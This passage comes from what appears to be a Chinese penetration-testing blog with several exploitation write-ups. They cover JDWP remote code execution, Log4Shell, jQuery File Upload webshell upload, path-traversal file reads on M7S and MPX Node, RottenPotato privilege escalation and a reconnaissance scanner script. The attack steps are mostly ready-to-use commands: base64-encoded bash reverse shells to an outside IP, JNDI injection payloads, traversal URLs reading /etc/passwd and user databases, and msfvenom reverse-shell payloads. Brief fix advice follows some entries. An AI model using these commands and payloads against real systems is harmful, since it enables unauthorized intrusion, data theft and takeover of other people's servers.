    <content><![CDATA[<h1 id="JDWP-RCE">1. JDWP RCE</h1><h2 id="漏洞说明">1.1. 漏洞说明:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在渗透测试的过程中，如果遇到目标Java应用开启了JDWP服务且没有配置访问控制的情况下，就可以利用JDWP实现远程代码执行。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞检测">1.2. 漏洞检测:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用鹰图或fofa进行检索</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220906104024801.png" alt="image-20220906104024801"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用Telnet命令探测，需要马上输入JDWP-Handshake，然后服务端返回一样的内容，证明是JDWP服务</span><br><span class="line">telnet *.*.*.* 8000 // 建议使用linux</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用">1.3. 漏洞利用:</h2><p>这里使用JDB工具进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进入到java/JDK/bin目录下</span><br><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=*.*.*.*,port=8000</span><br><span class="line">输入threads查看进程</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220906102848570.png" alt="image-20220906102848570"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thread &lt;线程id&gt; 选择一个休眠线程</span><br><span class="line">stepi // 启动休眠线程</span><br><span class="line">通过 print|dump|eval 命令，执行Java表达式从而达成命令执行</span><br><span class="line">eval java.lang.Runtime.getRuntime().exec(&quot;whoami&quot;) // 查看返回有没有进程号，如下图所示</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220906103310842.png" alt="image-20220906103310842"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220906103525223.png" alt="image-20220906103525223"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">加密网址:https://www.cnblogs.com/w328/p/15719300.html</span><br><span class="line">将反弹命令进行加密，成功监听到。 // 注意反弹的端口vps防火墙上需开</span><br><span class="line"><span class="built_in">eval</span> java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuNDEuODYvODA4MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220906103748846.png" alt="image-20220906103748846"></p>
<h2 id="修复建议">1.4. 修复建议:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关闭JDWP服务，或者JDWP服务监听的端口不对公网开放。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>高级语言</category>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>InfoGrather</title>
    <url>/pages/MyTools/InfoGrather.html</url>
    <content><![CDATA[<h1 id="InfoGrather">1. InfoGrather</h1><p>InfoGrather(信息收集)可以自动化进行域名解析成IP，whois查询，子域名暴破(可以检测泛解析)，基础端口的扫描，使用方法<code>python3 InfoGrather.py -d 域名 -f 子域目录地址</code></p>
<h2 id="使用效果">1.1. 使用效果</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221228094107704.png" alt="image-20221228094107704"></p>
<h2 id="源码">1.2. 源码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InfoGather</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, port, file</span>):</span><br><span class="line">        self.domain = domain</span><br><span class="line">        self.port = port</span><br><span class="line">        self.file = file</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> self.domain != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            self.resolve_ip()</span><br><span class="line">            self.whois_query()</span><br><span class="line">        <span class="keyword">if</span> self.domain != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> self.file <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;子域名扫描结果=================================&quot;</span>)</span><br><span class="line">            ran = self.ran_str(<span class="number">6</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                socket.gethostbyname(ran + <span class="string">&quot;.&quot;</span> + self.domain)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="built_in">print</span>(self.domain + <span class="string">&quot;不是泛解析，暴破结果如下↓↓↓↓↓↓↓↓↓↓↓↓↓&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(self.file, mode=<span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    subdomain_list = f.readlines()</span><br><span class="line">                    f.close()</span><br><span class="line">                <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">50</span>) <span class="keyword">as</span> t:</span><br><span class="line">                    <span class="keyword">for</span> sub <span class="keyword">in</span> subdomain_list:</span><br><span class="line">                        subdomain = sub.strip(<span class="string">&quot;\n&quot;</span>) + <span class="string">&quot;.&quot;</span> + self.domain</span><br><span class="line">                        t.submit(self.subdomain_burst, subdomain=subdomain)</span><br><span class="line">        <span class="keyword">if</span> self.domain != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> self.port != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            self.port_scan()</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;本次检查共耗时: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">int</span>(end_time-start_time)) + <span class="string">&quot;s&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">resolve_ip</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ip解析结果=====================================&quot;</span>)</span><br><span class="line">        url = <span class="string">&quot;https://site.ip138.com/domain/read.do?domain=&quot;</span> + self.domain + <span class="string">&quot;&amp;time=&quot;</span> + <span class="built_in">str</span>(time.time())</span><br><span class="line">        resp = requests.get(url=url, headers=headers).json()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> resp[<span class="string">&quot;data&quot;</span>]:</span><br><span class="line">                ip = i[<span class="string">&quot;ip&quot;</span>]</span><br><span class="line">                sign = i[<span class="string">&quot;sign&quot;</span>]</span><br><span class="line">                url = <span class="string">&quot;https://api.ip138.com/query/?ip=&quot;</span> + ip + <span class="string">&quot;&amp;oid=5&amp;mid=5&amp;datatype=jsonp&amp;sign=&quot;</span> + sign</span><br><span class="line">                resp2 = requests.get(url=url, headers=headers).json()</span><br><span class="line">                position = resp2[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">                <span class="built_in">print</span>(ip + <span class="string">&quot;==&gt;&quot;</span> + <span class="built_in">str</span>(position))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;site.ip138.com不支持该域名解析或存在缓存==&gt;&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">whois_query</span>(<span class="params">self</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;domain&quot;</span>: self.domain</span><br><span class="line">        &#125;</span><br><span class="line">        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line">        resp = requests.post(url=<span class="string">&quot;https://www.hostinger.com.hk/whois&quot;</span>, headers=headers, data=data,verify=<span class="literal">False</span>).content.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;Creation Date: (?P&lt;create_time&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Expiration Date: (?P&lt;expiration_time&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Registrar: (?P&lt;registrar&gt;.*?)\\r\\nRegistrar(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Domain Status: (?P&lt;status&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Name Server: (?P&lt;dns&gt;.*?)\\r\\nDNSSEC(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Contact Email: (?P&lt;email&gt;.*?)\\r\\n(.*?)&quot;</span></span><br><span class="line">                         <span class="string">r&quot;Contact Phone: (?P&lt;phone&gt;.*?)\\r\\n&quot;</span>, re.S)</span><br><span class="line">        result = obj.finditer(resp)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;whois查询结果==================================&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;创建时间: &quot;</span> + i.group(<span class="string">&#x27;create_time&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;过期时间: &quot;</span> + i.group(<span class="string">&#x27;expiration_time&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注册商: &quot;</span> + i.group(<span class="string">&#x27;registrar&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;状态: &quot;</span> + i.group(<span class="string">&#x27;status&#x27;</span>).replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;DNS: &quot;</span> + i.group(<span class="string">&#x27;dns&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注册邮箱: &quot;</span> + i.group(<span class="string">&#x27;email&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注册电话: &quot;</span> + i.group(<span class="string">&#x27;phone&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subdomain_burst</span>(<span class="params">subdomain</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip = socket.gethostbyname(subdomain)</span><br><span class="line">            <span class="built_in">print</span>(subdomain + <span class="string">&quot; ==&gt; &quot;</span> + ip)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">port_scan</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;端口扫描结果===================================&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> port <span class="keyword">in</span> self.port:</span><br><span class="line">                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                sock.settimeout(<span class="number">0.1</span>)</span><br><span class="line">                state = sock.connect_ex((self.domain, port))</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0</span> == state:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;port: &#123;&#125; is open&quot;</span>.<span class="built_in">format</span>(port))</span><br><span class="line">                sock.close()</span><br><span class="line">        <span class="keyword">except</span> socket.error:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ran_str</span>(<span class="params">str_num</span>):</span><br><span class="line">        str1 = <span class="string">&#x27;1234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLNMOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">        ran_string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(str_num):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(str1) - <span class="number">1</span>)</span><br><span class="line">            ran_string += str1[num]</span><br><span class="line">        <span class="keyword">return</span> ran_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">      ___       __        ___          _   _            </span></span><br><span class="line"><span class="string">     |_ _|_ _  / _|___   / __|_ _ __ _| |_| |_  ___ _ _ </span></span><br><span class="line"><span class="string">      | || &#x27; \|  _/ _ \ | (_ | &#x27;_/ _` |  _| &#x27; \/ -_) &#x27;_|</span></span><br><span class="line"><span class="string">     |___|_||_|_| \___/  \___|_| \__,_|\__|_||_\___|_|  InfoGrather 1.0 by qiwent@idi                                    </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    parse = argparse.ArgumentParser()</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-d&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Target domain name&quot;</span>, dest=<span class="string">&quot;domain&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Subdomain burst dictionary file&quot;</span>, dest=<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    parse.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=[<span class="number">21</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">86</span>,<span class="number">87</span>,<span class="number">88</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">135</span>,<span class="number">137</span>,<span class="number">161</span>,<span class="number">389</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">873</span>,<span class="number">1099</span>,</span><br><span class="line">                                                <span class="number">1433</span>,<span class="number">1521</span>,<span class="number">1900</span>,<span class="number">2082</span>,<span class="number">2181</span>,<span class="number">2222</span>,<span class="number">2375</span>,<span class="number">2376</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">3306</span>,<span class="number">3311</span>,<span class="number">3312</span>,</span><br><span class="line">                                                <span class="number">3389</span>,<span class="number">4440</span>,<span class="number">4848</span>,<span class="number">5001</span>,<span class="number">5432</span>,<span class="number">5560</span>,<span class="number">5900</span>,<span class="number">5901</span>,<span class="number">5902</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">7001</span>,<span class="number">7002</span>,<span class="number">7003</span>,</span><br><span class="line">                                                <span class="number">7004</span>,<span class="number">7005</span>,<span class="number">7006</span>,<span class="number">7007</span>,<span class="number">7008</span>,<span class="number">7009</span>,<span class="number">7010</span>,<span class="number">7778</span>,<span class="number">8009</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span>,</span><br><span class="line">                                                <span class="number">8085</span>,<span class="number">8086</span>,<span class="number">8087</span>,<span class="number">8088</span>,<span class="number">8089</span>,<span class="number">8090</span>,<span class="number">8649</span>,<span class="number">8888</span>,<span class="number">9000</span>,<span class="number">9200</span>,<span class="number">10000</span>,<span class="number">11211</span>,<span class="number">27017</span>,</span><br><span class="line">                                                <span class="number">28017</span>,<span class="number">50000</span>,<span class="number">51111</span>,<span class="number">50030</span>,<span class="number">50060</span>], <span class="built_in">help</span>=<span class="string">&quot;Port scan, default 81 ports&quot;</span>, dest=<span class="string">&quot;port&quot;</span>)</span><br><span class="line">    arg = parse.parse_args()</span><br><span class="line">    InfoGather(domain=arg.domain, port=arg.port, file=arg.file)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>MyTools</category>
      </categories>
  </entry>
  <entry>
    <title>JQuery</title>
    <url>/pages/WEB%E6%A1%86%E6%9E%B6/Jquery.html</url>
    <content><![CDATA[<h1 id="jQuery-File-Upload-未经身份验证的任意文件上传">1. jQuery File Upload 未经身份验证的任意文件上传</h1><h1 id="风险描述">2. 风险描述:</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jQuery-File-Upload是一个应用广泛的文件上传工具，该漏洞的主要原因为jQuery File Upload的安全限制被绕过，通过该漏洞攻击者可上传web shell进而造成远程命令执行。</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/22/rDYqwxzuXPkbWB2.png" alt="image-20220722140221363"></p>
<h1 id="影响版本">3. 影响版本:</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jQuery-File-Upload &lt;= 9.22.0</span><br></pre></td></tr></table></figure>

<h1 id="漏洞利用">4. 漏洞利用:</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">扫描后台，发现jquery-file-upload</span><br><span class="line">/Public/global/plugins/jquery-file-upload/</span><br><span class="line">添加文件开始上传冰蝎木马，上传成功，目录如下</span><br><span class="line">/Public/global/plugins/jquery-file-upload/server/php/files/shell.php</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/XdP3EcoDyLGCWhx.png" alt="image-20220722140657608"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/O5Sb3naAWKyxRFU.png" alt="image-20220722140409350"></p>
<h4 id="修复建议">4.0.0.1. 修复建议:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、官方已经在9.22.1更新中修复该漏洞，请及时更新。</span><br><span class="line">更新链接：https://github.com/blueimp/jQuery-File-Upload</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB框架</category>
      </categories>
  </entry>
  <entry>
    <title>Log4j2</title>
    <url>/pages/WEB%E6%A1%86%E6%9E%B6/Log4j2.html</url>
    <content><![CDATA[<h1 id="log4shell（CVE-2021-44228）">1. log4shell（CVE-2021-44228）</h1><h2 id="漏洞原理：">1.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限</span><br></pre></td></tr></table></figure>

<h2 id="影响版本：">1.2. 影响版本：</h2><p><code>Apache Log4j 2.x&lt;=2.14.1</code></p>
<h2 id="环境搭建：">1.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者:kali 192.168.179.129</span><br><span class="line">靶机:ubuntu 192.168.179.130 // 需要安装vulhub环境</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		cd vulhub/log4j/CVE-2021-44228/</span><br><span class="line">		sudo docker-compose up -d // 开启环境</span><br><span class="line">		访问靶机8983端口出现下图页面即部署完成</span><br><span class="line">		获取dnslog地址</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/iyeodAlMR9Qj8fV.png" alt="image-20220707145624994"></p>
<p><code>点击Get SubDomain获取dnslog地址</code></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/tIgUMDQFmJezrRS.png" alt="image-20220707152759367"></p>
<h2 id="漏洞复现：">1.4. 漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、寻找可以进行传递参数的注入点</span><br><span class="line">2、payload 2选1 </span><br><span class="line">	$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;	// 获取java版本号</span><br><span class="line">	$&#123;jndi:rmi://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/4vOdCtMlHck9LNs.png" alt="image-20220707152948587"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/FMvI5wm1H8LrEZ4.png" alt="image-20220707155129468"></p>
<h2 id="漏洞利用：">1.5. 漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar // 下载利用工具</span><br><span class="line">2、bash -i &gt;&amp; /dev/tcp/192.168.179.129/9999 0&gt;&amp;1 // poc，其中IP换成自己的,再进行base64加密，该语句不需要执行</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/YH7KeidZwUFjNWl.png" alt="image-20220707160722238"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3OS4xMjkvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 192.168.179.129 // 注意更换参数</span><br><span class="line"></span><br><span class="line">nc -lvvp 9999 // 开启监听</span><br><span class="line">红色箭头处选择一个利用代码，再次进行注入</span><br><span class="line">$&#123;jndi:rmi://192.168.179.129:1099/p1zao7&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/GLaZnUDuXmJOcBA.png" alt="image-20220707162044008"></p>
<p><code>成功获取权限，利用结束</code></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/SreNMaHmdDu9Csq.png" alt="image-20220707164224941"></p>
<h2 id="修复建议：">1.6. 修复建议：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、升级至安全版本Apache log4j-2.15.0-rc2</span><br><span class="line">2、JDK使用11.0.1、8u191、7u201、6u211及以上的高版本</span><br></pre></td></tr></table></figure>

<h1 id="log4shell-bypass-（hw2022）">2. log4shell bypass （hw2022）</h1>]]></content>
      <categories>
        <category>WEB框架</category>
      </categories>
      <tags>
        <tag>GetShell</tag>
      </tags>
  </entry>
  <entry>
    <title>M7S</title>
    <url>/pages/WEB%E6%A1%86%E6%9E%B6/M7S.html</url>
    <content><![CDATA[<h1 id="Monibuca（M7S）">1. Monibuca（M7S）</h1><h2 id="任意文件读取">1.1. 任意文件读取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/logrotate/download?file=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现">1.2. 漏洞复现</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220830204356354.png" alt="image-20220830204356354"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220830204423377.png" alt="image-20220830204423377"></p>
]]></content>
      <categories>
        <category>WEB框架</category>
      </categories>
  </entry>
  <entry>
    <title>MPX Node Overview</title>
    <url>/pages/WEB%E5%BA%94%E7%94%A8/MPX.html</url>
    <content><![CDATA[<h1 id="MPX-Node-文件读取漏洞">1. MPX Node  文件读取漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json</span><br></pre></td></tr></table></figure>

<ul>
<li><input disabled type="checkbox"> 主页</li>
</ul>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220927211116196.png" alt="image-20220927211116196"></p>
<h2 id="漏洞复现">1.1. 漏洞复现</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220927211310323.png" alt="image-20220927211310323"></p>
]]></content>
      <categories>
        <category>WEB应用</category>
      </categories>
  </entry>
  <entry>
    <title>权限提升</title>
    <url>/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MS16-075.html</url>
    <content><![CDATA[<h1 id="MS16-075（烂土豆）">1. MS16-075（烂土豆）</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文章链接</span><br><span class="line">https://mp.weixin.qq.com/s/OO64UdqiaAOH4H7UfTk0cQ</span><br></pre></td></tr></table></figure>

<p>1.木马连接到webshell后权限低</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221115101231624.png" alt="image-20221115101231624"></p>
<p>2.上传msf木马，上线msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSF木马生成</span><br><span class="line">apk:</span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=ip LPOR=8888 -o test.apk</span><br><span class="line"></span><br><span class="line">Linux：</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip LPOR=8888 -f elf&gt;shell.elf</span><br><span class="line"></span><br><span class="line">Mac:</span><br><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=ip LPOR=8888 -f macho&gt;shell.macho</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=ip LPOR=8888 -o xx.php</span><br><span class="line"></span><br><span class="line">exe：</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.208.138 LPORT=6666 -f exe &gt; reverse.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSF开启监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp   反向payload</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp    正向payload</span><br><span class="line">set lhost 192.168.179.128</span><br><span class="line">set lport 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221115101305993.png" alt="image-20221115101305993"></p>
<p>3.查看前置条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getprivs</span><br><span class="line"></span><br><span class="line">SeImpersonatePrivilege是土豆提权的必要条件。</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221115101556659.png" alt="image-20221115101556659"></p>
<p>4.上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/foxglovesec/RottenPotato  // RottenPotato下载地址</span><br><span class="line">将土豆上传到web目录下</span><br></pre></td></tr></table></figure>

<p>5.运行在令牌中提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use incognito</span><br><span class="line"># 加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)</span><br><span class="line">list_tokens -u</span><br><span class="line"># 列出目标机器用户的可用令牌</span><br><span class="line">execute -cH -f c:/potato.exe</span><br><span class="line"># 创建新的进程</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title>Metabase</title>
    <url>/pages/WEB%E5%BA%94%E7%94%A8/Metabase.html</url>
    <content><![CDATA[<h1 id="Metabase-任意文件读取">1. Metabase 任意文件读取</h1><h2 id="漏洞原理">1.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Metabase是一个开源的数据分析平台。在其0.40.0到0.40.4版本中，GeoJSON URL验证功能存在远程文件读取漏洞，未授权的攻击者可以利用这个漏洞读取服务器上的任意文件，包括环境变量等。</span><br></pre></td></tr></table></figure>

<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Metabase &lt; 0.40.5</span><br><span class="line">1.0.0 &lt; Metabase &lt; 1.40.5</span><br></pre></td></tr></table></figure>

